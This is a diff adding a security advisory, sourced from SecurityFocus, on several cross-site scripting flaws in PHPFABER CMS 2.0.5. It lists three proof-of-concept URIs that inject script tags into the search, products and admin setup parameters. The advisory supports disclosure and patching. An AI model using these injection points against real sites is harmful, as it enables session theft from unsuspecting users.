@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/41498/info
+
+PHPFABER CMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+PHPFABER CMS 2.0.5 is vulnerable; prior versions may also be affected.
+
+The following example URIs are available:
+
+http://www.example.com/cms/module.php?mod=Search&query=%3Cscript%3Ealert%280%29%3C/script%3E&stype=OR&go=++++Go!++++
+
+http://www.example.com/cms/module.php/Products/%22%3E%3Cscript%3Ealert%280%29%3C/script%3E
+
+http://www.example.com/cms/cms_admin/index.php?mod=%3Cscript%3Ealert%280%29%3C/script%3E&action=setup 
